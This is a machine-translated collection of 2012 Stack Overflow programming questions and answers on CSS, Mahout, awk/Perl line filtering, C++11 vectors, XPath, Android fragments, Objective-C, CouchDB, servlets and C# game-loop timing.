我尝试了以下风格，但徒劳无功

```
background-color: rgba(0, 0, 0, 0.6); 
```

这是[小提琴](http://jsfiddle.net/xPzwM/6/)

当我使用

```
background: #557700;
filter: alpha(opacity=30);
filter: progid:DXImageTransform.Microsoft.Alpha(opacity=30);
opacity:0.3; 
```

包括内部选择框在内的整个可折叠 div 变得透明。

我该如何解决这个问题，以便只有可折叠的背景是透明的。

**编辑**

这是用来让它工作的

```
$('#my_collapsible').find('div').first().css({ 'background-color': 'rgba(0,0,0,0.5)','color':'white'}) 
```

不知道这是不是一个好方法。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:10:22.427

实际上有类**ui-btn-up-c**正在制造问题。在此类中，已经应用了背景渐变，因此您无法体验透明度。

```
.ui-btn-up-c {
    background: -moz-linear-gradient(rgba(255, 255, 255, 0.5), rgba(241, 241, 241, 0.5)) repeat scroll 0 0 #EEEEEE; /* Add something like this*/
    border: 1px solid #CCCCCC;
    color: #222222;
    font-weight: bold;
    text-shadow: 0 1px 0 #FFFFFF;
} 
```

这将对您有所帮助：[CSS3 透明度 + 渐变](https://stackoverflow.com/questions/2293910/css3-transparency-gradient)

# hadoop - 使用 mahout seqdumper 转储序列文件

> ID：11155638
> 
> 赞同：0
> 
> 时间：2012-06-22T11:51:41.753
> 
> 标签：hadoop, mahout

我正在尝试使用 seqdumper 使用以下命令转储序列文件：

```
/opt/mahout/bin/mahout seqdumper -i ~/input_file -o ~/output 
```

但它会引发以下异常：

```
Exception in thread "main" java.lang.RuntimeException: java.io.IOException: WritableName can't load class: org.apache.mahout.clustering.WeightedPropertyVectorWritable 
```

我尝试将 $MAHOUT_HOME/core/target 目录中的 mahout jar 添加到 $HADOOP_CLASSPATH 但无济于事。

任何人都可以在这里指出正确的方向吗？

编辑：

我也试过通过 hdfs 查看文件

```
hadoop dfs -text /home/hduser/input_file 
```

但我得到同样的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:00:33.580

`core/target`不包含类。`core/target/classes`你至少在寻找。但是，如果设置正确，则您不需要做任何此类事情`MAHOUT_HOME`，因为脚本已经设置了类路径。

# linux - 查找和删除符合条件的行

> ID：11155641
> 
> 赞同：2
> 
> 时间：2012-06-22T11:51:53.017
> 
> 标签：linux, perl, bash, sed, awk

我有三个不同的文件，其中包含数字列。这些文件非常大（其中有 50,000,000+ 行）

例如，数据格式看起来像

```
1.2 22.333 10002.3432 223.2111
50.2166 2.873 15402.3432 322.1
.
.
. 
```

对于每个文件（file1、file2 和 file3），我需要执行以下操作：

**FILE1** 查找包含任意数字 x <=1000 的行并从 file1 中删除这些行

**FILE2** 查找包含任何数字 x >=1800 的行并从 file2 中删除这些行

**FILE3** 查找包含任何数字 1000<= x <=1800 的行并从 file3 中删除这些行。

我对 REGEX 的了解不足以弄清楚如何快速实现这一目标。任何帮助深表感谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-22T12:14:02.713

正如其他人在评论中提到的那样，正则表达式在这种情况下并不理想。

这是使用的一种方法`awk`：

```
awk '{for (i=1;i<=NF;i++) {if ($i<=1000) next}; if (NF) print}' file1 > new1 
```

这会解析`file`并抑制任何包含数字`<= 1000`（和空行）的行。然后将输出通过管道传输到新文件。

对于`file2`and `file3`，只需更改相关 if 语句中的条件以符合您的要求。

* * *

这是一个快速的解释：

```
 This is repeated for each line in the input file
                                |
      -------------------------------------------------------
     /                                                       \
awk '{for (i=1;i<=NF;i++) {if ($i<=1000) next}; if (NF) print}'
      ------------------   ------------------   -------------
             |                     |                  |
     for each field/column         |                  |
                                   |                  |
                      If condition is met, skip       |
                             this line                |
                                                      |
                                          otherwise, if the line is
                                          not empty (number of fields != 0)
                                          print out the whole line. 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-22T12:13:40.183

输入文件“sample”在哪里：

```
500 500 500
1000 1000 1000
2000 2000 2000
3000 3000 3000 
```

剥离`x <= 1000`：

```
$ awk '{ for (i=1; i<=NF; i++) { if ($i <= 1000) next } print }' < sample
2000 2000 2000
3000 3000 3000 
```

剥离`x >= 1800`：

```
$ awk '{ for (i=1; i<=NF; i++) { if ($i >= 1800) next } print }' < sample
500 500 500
1000 1000 1000 
```

剥离`1000 <= x <= 1800`：

```
$ awk '{ for (i=1; i<=NF; i++) { if (1000 <= $i && $i <= 1800) next } print }' < sample
500 500 500
2000 2000 2000
3000 3000 3000 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-22T12:14:16.627

这是一个相当短的 Perl 脚本，用于输出您的 FILE3：

```
#!/usr/bin/perl

use warnings;
use strict;

our $lower = 1000.0;
our $upper = 1800.0;

OUTER: while (<>) {
    $_ >= $lower && $_ < $upper and next OUTER for /(\S+)/g;
    print;
} 
```

您可以调整 FILE1 和 FILE2。

（无论好坏，我的脚本都包含基本的 Perl 习惯用法，尽管脚本很简洁，但如果您不了解 Perl，它几乎无法阅读。不过，这就是在 Perl 中完成的，这是一种您会喜欢学习的脚本语言，一名嫌疑人。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:22:31.273

类似以下脚本的内容应该适合您。

```
#!/usr/bin/perl
while(<>) {
    my $line = $_;
    foreach my $col (split ' ', $line){     #for each column
        unless ($col <= 1000) {
            print $line;
        }
        #add other statements for other files
    }
} 
```

**编辑**- 使代码更高效感谢 TLP

# c++ - 什么是 C++11 中的 2D 矢量构造重大变化？

> ID：11155643
> 
> 赞同：3
> 
> 时间：2012-06-22T11:51:55.293
> 
> 标签：c++, c++11

在阅读[MS Connect 网站上的一个问题的](http://connect.microsoft.com/VisualStudio/feedback/details/691756/std-make-pair-error-in-vc11)答案时，我注意到回复的以下部分：

> 这是我所知道的标准库中的一些重大更改之一（其他主要更改是不可变集和**2D 矢量构造**）。

答案很可能被认为是合法的，因为它来自致力于实施 STL 的 MS 员工。

那么有人知道他具体指的是什么吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T21:54:40.750

我给斯蒂芬发了电子邮件，问他在说什么。这是他的答案（为格式化而编辑）。听起来他并不打算在这里发布答案。如果他这样做，我会删除这个副本。

**从这里开始的一切都是斯蒂芬说话。**

我指的是这个：

```
#include <vector>
using namespace std;

int main() {
    vector<vector<int>> v(11, 22);
} 
```

它使用 VC10 SP1（遵循 C++03）编译，但不使用 VC11 RTM（遵循 C++11）：*[snip error message dump]*

**C++03 23.1.1 [lib.sequence.reqmts]/9**说：

> 对于本节和第 21 节中定义的每个序列：
> — 构造函数
> `template <class InputIterator> X(InputIterator f, InputIterator l, const Allocator& a = Allocator())`
> 应具有与以下相同的效果：
> `X(static_cast<typename X::size_type>(f), static_cast<typename X::value_type>(l), a)`
> if`InputIterator`是整数类型。

这转换`vector<vector<int>> v(11, 22)`为`vector<vector<int>> v(static_cast<size_t>(11), static_cast<vector<int>>(22))`，这是有效的。（`static_cast`能够调用显式构造函数，例如`vector`'s size 构造函数。）

**C++11 23.2.3 [sequence.reqmts]/14**说：

> 对于本条和第 21 条中定义的每个序列容器：
> — 如果使用不符合输入迭代器条件
> `template <class InputIterator> X(InputIterator first, InputIterator last, const allocator_type& alloc = allocator_type())`
> 的类型调用构造`InputIterator`函数，则构造函数不应参与重载决策。

这会将 (InIt, InIt) ctor 从重载决议中移除。那叶子`(size_type n, const T& value)`，在`T`哪里`vector<int>`。但是，这会尝试隐式转换`22`为临时的`vector<int>`（以便将其绑定到`const T&`）。的大小构造函数的明确性`vector`禁止这样做。

阅读[其他 SO question](https://stackoverflow.com/questions/5759232/stdvector-default-construction-c11-and-breaking-changes?lq=1)，这是一个不同的问题。

STL

# c# - XPath - 返回子节点但不返回后代

> ID：11155647
> 
> 赞同：1
> 
> 时间：2012-06-22T11:52:24.180
> 
> 标签：c#, xslt, xpath

我有以下 XML。

```
<Programme>
    <Intakes>
        <One>
            <Information />
        </One>
        <Two>
            <Information />
        </Two>
    </Intakes>
</Programme> 
```

列表框中想要的结果信息：

```
One
Two 
```

基本上，我希望为每个摄入量（一个、两个等）填充一个列表框。

没有多次出现。

所以我没有得到单独的摄入子节点？

当前代码：

```
 XPathNavigator nav;
        XPathDocument docNav;
        XPathNodeIterator NodeIter;
        string strExpression;

        docNav = new XPathDocument(docPath);
        nav = docNav.CreateNavigator();

        strExpression = "//Intakes/node()";
        NodeIter = nav.Select(strExpression);

        while (NodeIter.MoveNext())
        {
            lstIntakes.Items.Add(NodeIter.Current.Value);
        } 
```

但是，这只会将一项添加到包含节点内部所有 xml 的列表框中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-22T12:55:10.387

**XPath 是一种用于 XML 文档的查询语言，因此它不能改变文档的结构**。

**XSLT 是将 XML 文档转换为另一个**. 这个问题的 XSLT 解决方案是：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="node()|@*">
     <xsl:copy>
       <xsl:apply-templates select="node()|@*"/>
     </xsl:copy>
 </xsl:template>

 <xsl:template match="/*"><xsl:apply-templates/></xsl:template>
 <xsl:template match="One/node()|Two/node()"/>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<Programme>
    <Intakes>
        <One>
            <Information />
        </One>
        <Two>
            <Information />
        </Two>
    </Intakes>
</Programme> 
```

**产生了想要的正确结果：**

```
<Intakes>
   <One/>
   <Two/>
</Intakes> 
```

**更新**： OP 从根本上改变了这个问题——现在想要的结果是：

```
One  
Two 
```

这仍然不能由单个 XPath 1.0 表达式提供（并且当您使用 C# 时，您可能无法访问 XPath 2.0 实现）。

**您必须首先选择以下所有子元素`Intakes`：**

```
/*/Intakes/* 
```

**然后，您必须遍历返回的节点集，并为其中包含的每个元素评估此 XPath 表达式**：

```
name() 
```

# android - 隐藏的 backstack 片段在配置更改时重新显示

> ID：11155651
> 
> 赞同：14
> 
> 时间：2012-06-22T11:52:45.760
> 
> 标签：android, android-fragments, screen-rotation

我正在构建一个活动多片段应用程序。每次交易后我都会添加到后台。经过几次隐藏和显示片段，然后我旋转手机，添加到容器中的所有片段都恢复了，每个片段都在另一个之上。

可能是什么问题？为什么我的活动会显示我之前隐藏的片段？

我正在考虑隐藏所有以前隐藏现在显示的片段，但有没有更“优雅”的方式来做到这一点？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-09-22T02:00:17.233

在每个片段上使用`setRetainInstance(true)`，您的问题就会消失。
**警告：**将此设置为 true 将更改 Fragments 生命周期。
虽然`setRetainInstance(true)`解决了这个问题，但在某些情况下您可能不想使用它。为了解决这个问题，在 Fragment 上设置一个布尔属性并恢复可见性：

```
private boolean mVisible = true;
@Override
public void onCreate(Bundle _savedInstanceState) {
    super.onCreate(_savedInstanceState);
    if (_savedInstanceState!=null) {
        mVisible = _savedInstanceState.getBoolean("mVisible");
    }
    if (!mVisible) {
        getFragmentManager().beginTransaction().hide(this).commit();
    }
    // Hey! no setRetainInstance(true) used here.
}
@Override
public void onHiddenChanged(boolean _hidden) {
    super.onHiddenChanged(_hidden);
    mVisible = !_hidden;
}
@Override
public void onSaveInstanceState(Bundle _outState) {
    super.onSaveInstanceState(_outState);
    if (_outState!=null) {
        _outState.putBoolean("mVisible", mVisible);
    }
} 
```

一旦配置更改（例如屏幕方向），实例将被销毁，但 Bundle 将被存储并注入新的 Fragment 实例。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-05-14T05:33:39.147

我有同样的问题。您应该检查活动的 onCreateView() 函数中的源代码。

```
public class MainActivity extends Activity {
@Override
protected void onCreate(Bundle savedInstanceState) {
    setContentView(R.layout.activity_main);

    if(savedInstanceState == null){//for the first time

        FragmentManager fragmentManager = getFragmentManager();
        FragmentTransaction fragmentTransaction = fragmentManager.beginTransaction();

        FragmentExample fragment = new FragmentExample();
        fragmentTransaction.add(R.id.layout_main, fragment);
        fragmentTransaction.commit();

    }else{//savedInstanceState != null
        //for configuration change or Activity UI is destroyed by OS to get memory 
        //no need to add Fragment to container view R.id.layout_main again
        //because FragmentManager supported add the existed Fragment to R.id.layout_main if R.id.layout_main is existed.
        //here is one different between Fragment and View

    }
} 
```

活动主.xml：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:id="@+id/layout_main"> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-10T17:02:21.773

您可能想尝试使用该`replace()`功能而不是隐藏和显示。当我开始使用`Fragments`和使用替换功能时，我遇到了同样的问题，这确实有助于`Fragments`更好地管理。这是一个简单的例子：

```
fragmentManager.replace(R.id.fragmentContainer, desiredFragment, DESIRED_FRAGMENT_TAG)                                   
               .addToBackStack(null)
               .commit(); 
```

# jquery - JQUERY - 拖动和滚动（相同的 Photoshop 导航器调色板）

> ID：11155654
> 
> 赞同：1
> 
> 时间：2012-06-22T11:53:10.243
> 
> 标签：jquery, scroll, drag

我有这个脚本[http://jsfiddle.net/gphp/ZMmRv/4/](http://jsfiddle.net/gphp/ZMmRv/4/)

我有两个事件： 1 - div 是可拖动的，他的移动滚动页面 2 - 滚动页面移动 div

这两个事件一起发生了崩溃。可以一次申请一个。开始和停止事件？如何？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T15:23:44.860

好吧，我认为这不是更好的解决方案，但您可以将此作为开始并随意编辑：

[演示](http://jsfiddle.net/qqn57/)

```
$(document).ready(function(){
    $('#drag').css({
        'height': ($(document).height()/10),
        'width': ($(document).width()/10)
    });

    $("#drag").draggable({
        scrollSensitivity: 50,
        scrollSpeed: 10
    });

    $(window).scroll(function(){
        if( $('#drag').offset().top < $(window).scrollTop() )
            $("#drag").animate({top: $(window).scrollTop()}, "fast");

        if( $('#drag').offset().left < $(window).scrollLeft() )
            $("#drag").animate({left: $(window).scrollLeft()}, "fast");
    });        
}); 
```

# android - jQuery Mobile + Phonegap :: Ajax "Loading" gif 不动画

> ID：11155655
> 
> 赞同：2
> 
> 时间：2012-06-22T11:53:13.793
> 
> 标签：android, jquery, eclipse, jquery-mobile, cordova

我有一个内置 jQuery Mobile 和 Phonegap 的工作应用程序（在 Mac OSX 上使用 Eclipse）

一切正常，除了弹出 Ajax 加载消息时，动画 gif 没有动画，它只是停留在第一帧。

在网络浏览器中查看应用程序（因为它基本上是一个移动网站），gif 动画没有问题。

我已经读过，如果不使用网络浏览器，在 Android 上显示动画 gif 是很棘手的。有没有办法让它工作？也许用 CSS3 中的东西替换它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:50:26.690

尽管评论解释了它为什么不起作用，但这可能会让您开始寻找可行的替代品：[https ://stackoverflow.com/a/2767556/878602](https://stackoverflow.com/a/2767556/878602)

# objective-c - 协议声明错误

> ID：11155658
> 
> 赞同：0
> 
> 时间：2012-06-22T11:53:37.440
> 
> 标签：objective-c, ios

我收到一个错误：

> 未找到协议声明

我找不到是什么原因。现在我正在使用ARC。我怀疑这个问题是由于这个。这是我用于协议声明的代码

//这是我们声明Delegate的第一页

。H

```
@protocol ImageDelegate

@optional

-(void)ImageSelected:(UIImage *)ImageName;

@end

@interface GetAddedMovieList : UIViewController<UITableViewDataSource,UITableViewDelegate>{

    id<ImageDelegate> delegate;

}

@property(nonatomic, strong)id<ImageDelegate> delegate;

@end 
```

.m

@synthesize 代表；

* * *

//这是我尝试设置委托的页面。在这里我得到了错误。

```
@interface ImageEnlarge : UIViewController<ImageDelegate>{

IBOutlet UIImageView *imgEnlarge; 

NSString *stgImageName;     
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-22T12:25:33.867

Try like it.

```
 @protocol ImageDelegate<NSObject>

    @optional

    -(void)ImageSelected:(UIImage *)ImageName;

    @end 
```

And also add this property.

```
@property(nonatomic,assign)id<ImageDelegate> delegate; 
```

I think it will be helpful to you.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T12:15:34.177

这可能是一个导入循环。您是否为使用协议的位置#import 正确的文件？你是在协议文件中导入那个文件吗？如果是这样，那么您有一个导入循环。在协议的标头中使用前向声明，这应该可以解决它。（@班级）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T11:57:27.757

您正在放置`@interface`一个 .m 文件，您是要创建一个私有的`@interface`吗？在`IBOutlet`那里宣布？

* * *

看到你的编辑后，我猜你的 ImageEnlarge 类的 .h 上只缺少一个导入。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-22T12:05:40.230

我在您的代码中看到了几个（可能的）问题。

```
@property(nonatomic, strong)id<ImageDelegate> delegate; 
```

代表应该很弱。GetAddedMovieList 现在确实拥有委托，因此不应影响其生命周期。

```
@synthesize delegate = delegate; 
```

默认情况下，@synth 最近使用 ivar_ 或 _ivar。顺便说一句，使用最新的 LLVM @synth 不再需要，也不需要 ivars。

@synthesize 在 @implementation 之外？

你检查过你的#imports 吗？

# iphone - uitableview 触摸事件

> ID：11155665
> 
> 赞同：0
> 
> 时间：2012-06-22T11:53:57.693
> 
> 标签：iphone, objective-c

我在里面创建了一个按钮`UITableViewCell`，当我单击一个按钮时，我想用索引值转到作者视图控件。

```
 tapped  = [UIButton buttonWithType:UIButtonTypeCustom];

[tapped setFrame:CGRectMake(0, 0, 320, 100)];
[tapped setTitle:@"button" forState:UIControlStateNormal];

NSInteger tet;

tet = indexPath.row; 
[tapped addTarget:self action:@selector(tapped:) forControlEvents: UIControlEventTouchDown];

[Cell addSubview:tapped]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T11:55:26.287

您应该使用 indexPath.row 标记按钮。

```
tapped.tag = indexPath.row; 
```

在您的事件处理代码中，您应该使用该标签来查找索引。

```
-(void) tapped:(UIButton *)sender
{
    UIButton *btn = (UIButton *)sender;
    int index = btn.tag;
    //Do rest...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-22T11:59:34.350

尝试这个

```
-(void) tapped:(UIButton *)sender
{
    UITableViewCell *clickedCell = (UITableViewCell *)[[sender superview] superview];
    NSIndexPath *indexPath = [myTableView indexPathForCell:clickedCell];
    int section = indexPath.section;
    // You get easily your index path row
    int row = indexPath.row;
    // push your controller 

} 
```

首先更新你的代码

使用你的活动`UIControlEventTouchUpInside`

```
tapped  = [UIButton buttonWithType:UIButtonTypeCustom];

[tapped setFrame:CGRectMake(0, 0, 320, 100)];
[tapped setTitle:@"button" forState:UIControlStateNormal];

NSInteger tet;

tet = indexPath.row; 
[tapped addTarget:self action:@selector(tapped:) forControlEvents: UIControlEventTouchUpInside];

[Cell addSubview:tapped]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-22T12:00:44.897

您可以按如下方式标记按钮：

```
tapped.tag = indexPath.row 
```

而在 tapped 方法中，您可以按如下方式使用它：

```
-(IBAction)tapped:(id)sender
{
 UIButton *btn = (UIButton *)sender;
int index = btn.tag;

} 
```

根据您的要求使用此索引...

# couchdb - Couchbase/CouchDB 按部分键分组并按另一部分排序

> ID：11155668
> 
> 赞同：0
> 
> 时间：2012-06-22T11:54:07.520
> 
> 标签：couchdb, mapreduce, couchbase

我有一个用户之间的消息数据库。文档看起来像：

```
"_id": "msg_0bec56c1-cbfb-47a5-8882-4a61fec332cd",
"_rev": "1-00000eda4d07c93d0000009100000112",
"$flags": 0,
"$expiration": 0,
"Date": 1340280439303,
"OwnerId": 35,
"RcptId": 37,
"SndrId": 35,
"Text": "msg5",
"Unread": false,
"id": "0bec56c1-cbfb-47a5-8882-4a61fec332cd",
"type": "msg" 
```

对于每条消息，它存储 2 个具有不同 OwnerId 的文档。我需要得到一个指定的人和10 个**按最后消息日期排序的****uniqe** “笔友”之间的最新消息。

 **我的查询参数：

> 降序=true&endkey=[35,35]&startkey=[35,35,"{}"]&limit=10&skip=0

我的地图功能：

> 函数 (doc) {
>    if (doc.type == "msg"){
>      emit([doc.OwnerId, doc.SndrId, doc.Date, doc.RcptId], doc);
>      发射（[doc.OwnerId，doc.RcptId，doc.Date，doc.SndrId]，doc）；
>    }
> }

结果，我得到了所需帐户的消息列表。键中的最后一个值（第 4 个）是我们应该对值进行分组的值。

由于日期不同，组级别 4 的分组不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-23T09:49:18.487

这是我的新地图功能，它完全符合我的要求，**但只有当我有一台服务器时**。

```
var uniqPairs = [];
function(doc){
  if (doc.type == "msg"){
    if (doc.OwnerId == doc.SndrId){
      if (uniqPairs.indexOf(doc.OwnerId + "_" + doc.RcptId) == -1){
        uniqPairs.push(doc.SndrId + "_" + doc.RcptId);
        uniqPairs.push(doc.RcptId + "_" + doc.SndrId);
        emit([doc.OwnerId, doc.Date], {"owner": doc.OwnerId, "from":doc.SndrId, "to":doc.RcptId});
      }
    }
    if (doc.OwnerId == doc.RcptId){
      if (uniqPairs.indexOf(doc.OwnerId + "_" + doc.SndrId) == -1){
        //uniqPairs.push(doc.SndrId + "_" + doc.RcptId);
        uniqPairs.push(doc.RcptId + "_" + doc.SndrId);
        emit([doc.OwnerId, doc.Date], {"owner": doc.OwnerId, "from":doc.SndrId, "to":doc.RcptId});
      }
    }
  }
} 
```

因此，对于集群，我牺牲了“按日期排序”并获得了 map/reduce 的此类功能：

地图：

```
function (doc) {
  if (doc.type == "msg"){
    if (doc.OwnerId == doc.SndrId){
      emit([doc.OwnerId, doc.RcptId, doc.Date], {"Date":doc.Date, "OwnerId":doc.OwnerId, "RcptId":doc.RcptId, "SndrId":doc.SndrId, "Text":doc.Text, "Unread":doc.Unread, "id": doc.id, "type":doc.type});
    } else {
      emit([doc.OwnerId, doc.SndrId, doc.Date], {"Date":doc.Date, "OwnerId":doc.OwnerId, "RcptId":doc.RcptId, "SndrId":doc.SndrId, "Text":doc.Text, "Unread":doc.Unread, "id": doc.id, "type":doc.type});
    }
  }
} 
```

减少：

```
var tmp = [];
var t = [];
function findRecent(arr){
  var max = 0;
  var maxId = 0;
  for (var i in arr){
    if (arr[i].Date > max){
      max = arr[i].Date;
      maxId = i;
    }
  }
  return arr[maxId];
}
function(k,v,r){
  if (!r){
    tmp.push(v);
  }
  else{
    tmp.push(v);
  }
  if (r){
    for (var i1 in tmp[0])
    {  
        t.push(tmp[0][i1]);
    }
  } else {
     return findRecent(v);
  }
  return findRecent(t);
} 
```

如果有人知道更好的解决方案（即如何按日期排序结果） - 欢迎您回答。**

# c# - 如何将我的应用程序页面之一固定到主页 - Windows Phone 7？

> ID：11155671
> 
> 赞同：0
> 
> 时间：2012-06-22T11:54:24.070
> 
> 标签：c#, windows-phone-7, windows-phone-7.1, msdn

在 SOF 1.5 年已经有人[问](https://stackoverflow.com/questions/4852154/how-do-i-add-a-windows-phone-7-pin-to-start-command-within-my-app-to-jump-direct)过这个问题，我想再问一次。

是否可以将我的应用程序中的特定页面固定到主页，以便当用户单击它时，它会到那里。我看到[这个](http://www.windowsphone.com/en-US/apps/a4d7d142-2dbe-42d8-a8d0-0a2986ba868e)应用程序确实是这样做的（尽管它是由 Microsoft 发布的）。但是在网上和 msdn 文档进行了详尽的搜索之后，我找不到类似的实现。

对此的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T12:01:29.607

我想你正在寻找这个：

[如何：为 Windows Phone 创建、删除和更新磁贴](http://msdn.microsoft.com/en-us/library/hh202979%28v=vs.92%29.aspx)

具体来说，请查看部分： **实现 SecondaryTile 页面**，因为这涵盖了您正在寻找的功能。

快乐编码！

# servlets - 一个 Servlet 如何访问其他 Servlet 的数据成员？

> ID：11155676
> 
> 赞同：-1
> 
> 时间：2012-06-22T11:54:36.350
> 
> 标签：servlets

我有两个 servlet。1 用作我的小程序客户端的主服务器，其他用作辅助服务器。

我只想让我的 servlet2（辅助）向 servlet1 询问它拥有的会话数，假设 servlet1 将该信息存储在一个 int 中，那么我们如何从 servlet2 访问该 int。前提是两个 servlet 都是不同的 Web 项目。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-22T14:32:30.250

这是您尝试实施的糟糕设计。您真正需要的是一个**应用程序范围变量**

引用自[http://www.daniweb.com/web-development/jsp/threads/78622/difference-between-session-and-application-scope-at-jsp](http://www.daniweb.com/web-development/jsp/threads/78622/difference-between-session-and-application-scope-at-jsp)

'应用范围是最广泛的范围，只应在必要时使用。您可以在不支持会话的 JSP 中创建在应用程序级别绑定的对象，因此在使用这些类型的 JSP 时，应用程序范围对于存储信息很有用。您还可以使用应用程序绑定对象在同一应用程序的不同会话之间共享数据。

看看这个使用计数器作为应用程序范围变量的示例[http://java.sun.com/developer/onlineTraining/JSPIntro/exercises/Counter/index.html](http://java.sun.com/developer/onlineTraining/JSPIntro/exercises/Counter/index.html)

# c# - 跟踪在调试器中花费的时间

> ID：11155682
> 
> 赞同：5
> 
> 时间：2012-06-22T11:55:00.987
> 
> 标签：c#, .net, breakpoints, visual-studio-debugging

[ [ EDIT 2x ] 我认为我的原始问题措辞错误，因此我将其放在下面并准确地重写了我想要了解的内容，以供未来的读者阅读。]

～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～～
[新的，闪亮的，清晰的问题，更好的措辞]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~

我有一个正在为模拟/游戏框架运行的循环。这个循环中有几个地方需要确定已经过去了多少时间 - 实际上 - 已经过去了，以便这些特殊地方的逻辑 - 特别是渲染和更新 - 可以正常工作。它可以选择是否为固定时间步长（`unfixed[update/render]`为假）。

当基于断点的调试在应用程序的任何点进行时，就会出现问题，因为它使用秒表来计算已经过去了多少实时（为了物理和动画以真实的速度移动，而不是基于多少计算机可以产生的帧）。

它看起来（大致）像这样，为应用程序循环的每个“部分”使用***多个秒表**，需要知道自该“部分”最后一次发生以来已经过去了多少时间*：

```
while ( RunningTheSimulation ) {
    /* ... Events and other fun awesome stuff */

    TimeSpan updatedifference = new TimeSpan( updatestopwatch.ElapsedTicks );

    if ( unfixedupdate || updatedifference > updateinterval ) {

        Time = new GameTime( updatedifference,
                                    new TimeSpan( gamestopwatch.ElapsedTicks ) );
        Update( Time );
        ++updatecount;
        updatestopwatch.Reset( );
        updatestopwatch.Start( );
    }

    TimeSpan renderdifference = new TimeSpan( renderstopwatch.ElapsedTicks );

    if ( unfixedrender || renderdifference > renderinterval ) {

        Time = new GameTime( renderdifference,
                                 new TimeSpan( gamestopwatch.ElapsedTicks ) );
        Render( Time );
        ++rendercount;
        renderstopwatch.Reset( );
        renderstopwatch.Start( );

    }
} 
```

关于变量的一些信息：

`updatestopwatch`是在 Update() 函数之外花费的时间的[秒表，](http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.aspx)

`renderstopwatch`是在 Render() 函数之外花费的时间的[秒表，并且](http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.aspx)

`gamestopwatch`是模拟/游戏本身的总经过时间的[秒表](http://msdn.microsoft.com/en-us/library/system.diagnostics.stopwatch.aspx)。

当我在应用程序的任何位置进行调试时，就会出现问题。因为秒表是实时测量的，所以任何类型的基于断点的调试都将完全取消模拟，因为无论我是否在调试应用程序，秒表都会继续计算时间。我没有使用秒表来衡量性能：我使用它们来跟踪更新、渲染和其他事件（如上图所示）再次发生之间的时间。当我断点并分析并修复 Update() 中的错误时，这变得非常令人沮丧，但是 Render() 时间完全关闭，以至于模拟结果的任何显示都会被报复性地踢到脸上。

也就是说，当我完全停止调试时，这显然不是问题，但是我有很多开发工作要做，而且我要调试很长时间，所以只是假装这不是不方便是行不通的， 很遗憾。=[

我查看了性能计数器，但我似乎无法理解如何让它们在我正在尝试做的事情的上下文中工作：渲染和更新可以包含任意数量的任意代码（它们是特定的到在这个循环之上运行的任何模拟`while`），这意味着我不能稳定地`PerformanceCounter.Increment()`为循环的各个组件做一个。

我将继续探讨 System.Diagnostics 和其他 .NET 命名空间，但到目前为止，我对如何“忽略”在附加的调试器中花费的时间感到困惑......

任何人有任何想法或见解？

[ [ EDITS 5x ] 更正了拼写错误并确保所有内容的格式正确。对于那个很抱歉。]

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
[原来的，不太清楚的问题]
~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~

我有一个在 C# 应用程序中运行的恒定循环，我一直在调试它。我目前正在使用秒表，但我可以使用任何其他机制来跟踪经过的时间。当我在这个循环中的某处使用断点之类的事情时，我的问题就开始了（包含在典型的`while (true) { ... }`:

```
if ( unfixedupdate || updatedifference > updateinterval ) 
{
    Time = new GameTime( updatedifference, 
                        new TimeSpan( gamestopwatch.ElapsedTicks ) );
    Update( Time );
    ++updatecount;
    updatestopwatch.Reset( );
    updatestopwatch.Start( );
} 
```

时间测量本身很好，但它测量实际的实时时间——包括我花在调试上的*任何时间。*这意味着，如果我在 17 秒后四处闲逛`updatestopwatch.Reset()`，这会在我的循环中变得复杂，并且 - 对于该循环的至少 1 次重新运行 - 我必须处理我在所有计算中实时花费的额外时间。

有什么方法可以连接到调试器以知道它何时冻结应用程序，所以我可以反测量时间并相应地减去它？正如所标记的那样，我为此使用 .NET 和 C#，但与 Visual Studio 相关的任何内容都可能有助于我朝着正确的方向前进。

